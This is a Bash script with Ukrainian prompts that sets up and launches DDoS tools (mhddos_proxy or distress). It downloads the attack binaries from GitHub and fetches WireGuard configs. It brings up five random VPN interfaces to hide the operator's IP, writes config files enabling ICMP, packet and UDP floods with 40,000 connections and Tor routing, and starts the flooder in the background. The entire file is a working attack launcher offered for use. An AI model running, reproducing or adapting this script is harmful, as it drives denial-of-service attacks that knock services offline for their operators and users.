#!/bin/bash

set -e

SETTINGS_FILE="$HOME/.kaljan747_settings"

# === Функція запиту USER-ID ===
ask_user_id() {
    if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
        USER_ID=$(zenity --entry --title="Введення USER-ID" --text="Введіть ваш user-id (тільки цифри):" --width=400)
    else
        read -p "Введіть ваш user-id (тільки цифри): " USER_ID
    fi
}

# === Функція запиту параметрів запуску ===
ask_run_parameters() {
    if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
        USER_SELECTION=$(zenity --forms --title="Kaljan747 Конфігурація" \
            --text="Вкажіть параметри запуску" \
            --add-combo="Модуль" --combo-values="mhddos_proxy|distress" \
            --add-combo="Редагувати INI перед запуском?" --combo-values="Так|Ні" \
            --add-combo="Режим запуску" --combo-values="screen у фоні|screen відкрито|без screen" \
            --width=400)
        [ -z "$USER_SELECTION" ] && { echo "Запуск скасовано"; exit 1; }
        IFS="|" read -r SELECTED_MODULE EDIT_INI SELECTED_RUN_MODE <<< "$USER_SELECTION"
    else
        echo "Виберіть модуль:"
        echo "1) mhddos_proxy"
        echo "2) distress"
        read -p "Ваш вибір (1/2): " mod_choice
        SELECTED_MODULE=$( [ "$mod_choice" = "1" ] && echo "mhddos_proxy" || echo "distress" )

        echo "Редагувати INI перед запуском?"
        echo "1) Так"
        echo "2) Ні"
        read -p "Ваш вибір (1/2): " edit_choice
        EDIT_INI=$( [ "$edit_choice" = "1" ] && echo "Так" || echo "Ні" )

        echo "Виберіть режим запуску:"
        echo "1) screen у фоні"
        echo "2) screen відкрито"
        echo "3) без screen"
        read -p "Ваш вибір (1/2/3): " run_choice
        case "$run_choice" in
            1) SELECTED_RUN_MODE="screen у фоні";;
            2) SELECTED_RUN_MODE="screen відкрито";;
            3) SELECTED_RUN_MODE="без screen";;
        esac
    fi
}

# === Завантаження або запит налаштувань ===
if [ -f "$SETTINGS_FILE" ]; then
    if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
        zenity --question --title="Налаштування" --text="Використати збережені налаштування?" --ok-label="Так" --cancel-label="Ні"
        USE_OLD=$?
    else
        echo "Знайдено збережені налаштування:"
        echo "1) Використати старі"
        echo "2) Ввести нові"
        read -p "Ваш вибір (1/2): " choice
        if [ "$choice" = "1" ]; then
            USE_OLD=0
        else
            USE_OLD=1
        fi
    fi

    if [ "$USE_OLD" -eq 0 ]; then
        source "$SETTINGS_FILE"
    else
        USER_ID=""
        SELECTED_MODULE=""
        EDIT_INI=""
        SELECTED_RUN_MODE=""
    fi
fi

if [ -z "$USER_ID" ]; then
    while true; do
        ask_user_id
        if [ -z "$USER_ID" ]; then
            echo "User-id обов'язковий. Завершення."
            exit 1
        fi
        if [[ "$USER_ID" =~ ^[0-9]+$ ]]; then
            break
        else
            if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
                zenity --error --text="Помилка: USER-ID має містити тільки цифри!" --width=400
            else
                echo "Помилка: USER-ID має містити тільки цифри!"
            fi
        fi
    done
fi

if [ -z "$SELECTED_MODULE" ] || [ -z "$EDIT_INI" ] || [ -z "$SELECTED_RUN_MODE" ]; then
    ask_run_parameters
fi

# === Збереження налаштувань у файл ===
cat > "$SETTINGS_FILE" <<EOF
USER_ID="$USER_ID"
SELECTED_MODULE="$SELECTED_MODULE"
EDIT_INI="$EDIT_INI"
SELECTED_RUN_MODE="$SELECTED_RUN_MODE"
EOF

# === Перевірка прав користувача ===
if [ "$(id -u)" -eq 0 ]; then
    SUDO=""
else
    if command -v sudo >/dev/null 2>&1; then
        SUDO="sudo"
    else
        echo "sudo не знайдено. Встановіть або увійдіть як root."
        exit 1
    fi
fi

# === Встановлення необхідних пакетів ===
if command -v apt >/dev/null 2>&1; then
    $SUDO apt update -y
    $SUDO apt install -y curl wget git screen sed wireguard zenity
elif command -v dnf >/dev/null 2>&1; then
    $SUDO dnf install -y curl wget git screen sed wireguard-tools zenity
elif command -v yum >/dev/null 2>&1; then
    $SUDO yum install -y curl wget git screen sed wireguard-tools zenity
elif command -v apk >/dev/null 2>&1; then
    $SUDO apk add curl wget git screen sed wireguard-tools zenity
else
    echo "Підтримуваний пакетний менеджер не знайдено."
    exit 1
fi

# === Підготовка директорій ===
MODULE_DIR="$HOME/modules"
WG_DIR="$HOME/wg_confs"
mkdir -p "$MODULE_DIR" "$WG_DIR"
touch "$MODULE_DIR/mhddos.ini" "$MODULE_DIR/distress.ini"

# === Вибір модуля ===
case "$SELECTED_MODULE" in
    mhddos_proxy)
        MODULE="$MODULE_DIR/mhddos_proxy"
        CONFIG_FILE="$MODULE_DIR/mhddos.ini"
        MODULE_NAME="mhddos"
        DOWNLOAD_LINK="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
        ;;
    distress)
        MODULE="$MODULE_DIR/distress"
        CONFIG_FILE="$MODULE_DIR/distress.ini"
        MODULE_NAME="distress"
        DOWNLOAD_LINK="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
        ;;
esac

[ -f "$MODULE" ] || wget -qO "$MODULE" "$DOWNLOAD_LINK"
chmod +x "$MODULE"

# === Завантаження WG-конфігів ===
WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
WG_RAW_BASE="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"
CONF_LIST=$(curl -fsSL "$WG_REPO_HTML" | grep -oP '(?<=href=").*?\.conf(?=")' | grep '/k7771/Kaljan747/blob/' | sed -e 's|^/|https://github.com/|' -e 's|blob/|raw/|')

for url in $CONF_LIST; do
    file=$(basename "$url")
    wget -qO "$WG_DIR/$file" "$url"
done

$SUDO chmod 600 "$WG_DIR"/*.conf 2>/dev/null || true

# === Зупинка активних WG ===
for iface in $(wg show interfaces 2>/dev/null); do
    $SUDO wg-quick down "$iface" || true
    $SUDO ip link delete "$iface" || true
done

# === Підключення нових WG ===
WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 5))
WG_IFACES=()
for conf in "${WG_FILES[@]}"; do
    IFACE_NAME=$(basename "$conf" .conf)
    $SUDO wg-quick up "$conf"
    WG_IFACES+=("$IFACE_NAME")
    sleep 1
done

VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")

# === Оновлення ini файлів ===
echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$MODULE_DIR/mhddos.ini"
echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$MODULE_DIR/distress.ini"

if [ "$EDIT_INI" = "Так" ]; then
    if [ -n "$DISPLAY" ]; then
        zenity --text-info --editable --filename="$CONFIG_FILE" --title="Редагування INI" > "$CONFIG_FILE.tmp"
        mv "$CONFIG_FILE.tmp" "$CONFIG_FILE"
    else
        nano "$CONFIG_FILE"
    fi
fi

# === Запуск модуля ===
case "$SELECTED_RUN_MODE" in
    "screen у фоні") screen -dmS "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
    "screen відкрито") screen -S "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
    "без screen") "$MODULE" $(cat "$CONFIG_FILE") & ;;
esac

exit 0
